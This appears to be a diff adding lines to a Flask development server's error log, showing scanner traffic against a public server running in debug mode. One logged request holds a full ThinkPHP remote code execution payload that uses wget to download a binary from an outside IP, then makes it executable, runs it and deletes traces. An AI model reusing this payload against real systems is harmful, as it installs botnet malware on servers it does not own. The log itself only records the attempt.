@@ -28006,3 +28006,8 @@ Traceback (most recent call last):
   File "/usr/local/lib/python3.11/dist-packages/engineio/base_server.py", line 229, in _get_socket
     raise KeyError('Session is disconnected')
 KeyError: 'Session is disconnected'
+ * Serving Flask app 'website'
+ * Debug mode: on
+64.62.197.11 - - [25/Aug/2024 11:43:29] code 400, message Bad request version ('À\x14À')
+5.8.11.202 - - [25/Aug/2024 12:12:21] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+82.84.44.15 - - [25/Aug/2024 12:58:08] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.66.231.153/bins/ugh-x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp selfrep.ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
